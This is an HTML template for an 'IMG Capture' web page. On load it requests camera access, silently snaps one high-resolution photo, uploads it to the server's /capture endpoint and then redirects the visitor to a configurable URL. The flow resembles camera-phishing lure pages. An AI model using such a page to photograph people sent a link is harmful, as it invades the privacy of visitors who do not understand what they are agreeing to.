<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IMG Capture</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap');
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Orbitron', monospace;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
        }
        
        .container {
            text-align: center;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.2);
            max-width: 500px;
            width: 90%;
        }
        
        .logo {
            font-size: 3rem;
            font-weight: 900;
            margin-bottom: 20px;
            text-shadow: 0 0 20px rgba(255, 255, 255, 0.5);
            background: linear-gradient(45deg, #fff, #f0f0f0);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        
        .status {
            font-size: 1.2rem;
            margin-bottom: 30px;
            opacity: 0.9;
        }
        
        .loading {
            display: none;
            margin: 20px 0;
        }
        
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-top: 4px solid white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 10px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .permission-btn {
            background: linear-gradient(45deg, #ff6b6b, #ee5a24);
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 1.1rem;
            font-weight: 700;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s ease;
            font-family: 'Orbitron', monospace;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .permission-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
        }
        
        .permission-btn:active {
            transform: translateY(0);
        }
        
        .error {
            color: #ff6b6b;
            margin-top: 10px;
            font-size: 0.9rem;
        }
        
        .success {
            color: #51cf66;
            margin-top: 10px;
            font-size: 0.9rem;
        }
        
        .redirect-info {
            margin-top: 20px;
            padding: 15px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            font-size: 0.9rem;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">IMG Capture</div>
        <div class="status" id="status">Requesting camera permission...</div>
        
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <div>Capturing and saving image...</div>
        </div>
        
        <button class="permission-btn" id="permissionBtn" onclick="requestPermission()">
            Allow Camera Access
        </button>
        
        <div id="message"></div>
        
        <div class="redirect-info">
            <strong>Redirect URL:</strong> <span id="redirectUrl">{{ redirect_url }}</span>
        </div>
    </div>

    <script>
        let stream = null;
        let video = null;
        let canvas = null;
        let redirectUrl = '{{ redirect_url }}';
        
        // Auto-request permission on page load
        window.onload = function() {
            setTimeout(() => {
                requestPermission();
            }, 1000);
        };
        
        async function requestPermission() {
            const statusEl = document.getElementById('status');
            const btn = document.getElementById('permissionBtn');
            const messageEl = document.getElementById('message');
            
            try {
                statusEl.textContent = 'Requesting camera permission...';
                btn.style.display = 'none';
                
                // Request camera access
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        width: { ideal: 1920 },
                        height: { ideal: 1080 }
                    } 
                });
                
                statusEl.textContent = 'Camera access granted! Capturing image...';
                
                // Create video element to capture frame
                video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                
                // Wait for video to be ready
                await new Promise(resolve => {
                    video.addEventListener('loadedmetadata', resolve);
                });
                
                // Create canvas to capture frame
                canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);
                
                // Convert to base64
                const imageData = canvas.toDataURL('image/png');
                
                // Stop the stream
                stream.getTracks().forEach(track => track.stop());
                
                // Show loading
                document.getElementById('loading').style.display = 'block';
                statusEl.textContent = 'Saving image...';
                
                // Send to server
                const response = await fetch('/capture', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ image: imageData })
                });
                
                const result = await response.json();
                
                if (result.success) {
                    messageEl.innerHTML = `<div class="success">✅ Image saved as: ${result.filename}</div>`;
                    statusEl.textContent = 'Image captured successfully! Redirecting...';
                    
                    // Redirect after a short delay
                    setTimeout(() => {
                        window.location.href = redirectUrl;
                    }, 1500);
                } else {
                    messageEl.innerHTML = `<div class="error">❌ Error: ${result.error}</div>`;
                    statusEl.textContent = 'Error occurred. Please try again.';
                    btn.style.display = 'block';
                    btn.textContent = 'Try Again';
                }
                
            } catch (error) {
                console.error('Error:', error);
                messageEl.innerHTML = `<div class="error">❌ Camera access denied or error occurred: ${error.message}</div>`;
                statusEl.textContent = 'Camera access denied. Please allow camera access and try again.';
                btn.style.display = 'block';
                btn.textContent = 'Try Again';
            }
        }
        
        // Handle page visibility change to stop stream if user switches tabs
        document.addEventListener('visibilitychange', function() {
            if (document.hidden && stream) {
                stream.getTracks().forEach(track => track.stop());
            }
        });
    </script>
</body>
</html>
